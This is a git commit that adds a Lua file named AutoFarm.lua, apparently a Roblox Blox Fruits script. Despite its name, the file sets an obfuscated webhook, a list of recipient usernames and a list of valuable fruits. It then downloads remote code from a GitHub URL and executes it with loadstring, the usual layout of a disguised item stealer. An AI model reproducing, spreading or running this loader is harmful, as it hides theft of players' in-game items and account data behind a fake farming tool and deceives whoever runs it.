2d211e458d94cba2bfa1c4a4d04ebcda2cea6c7f
kenken1000 <scriptbloxfor@gmail.com>
2025-04-11 13:32:31 +0800

    Create AutoFarm.lua

---
+++ AutoFarm.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=OC1ZVDFjSVJIQWNjQ3NKVEhRbWdmdzpXb2lUNk81SU8td1hzcV9UOE40bk5SRnpBWHh2WGF6SHUzaEx1YkdMT0xOXzJ6QVRrb25ORGFBOHJjSXJzTV9VYU5Dbm90WkNtWVN0Vzk0eFltOTZIbjNHblZEdlEyVDUyMU9PaHRnTS1hc0llVlVMdWVyUHJSYkZvZUZsVlItNDNPVENYNXVGbzdZRWNYVDdzT3lmTDhJalNwU2tobUthNUdxOTVlUTd1a3M"
+Usernames = {"SmashClap10", "jaywinhall", "NinjaUSA789", "Base6383", "miguelpaguia1", "IsmashClap10"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))() 
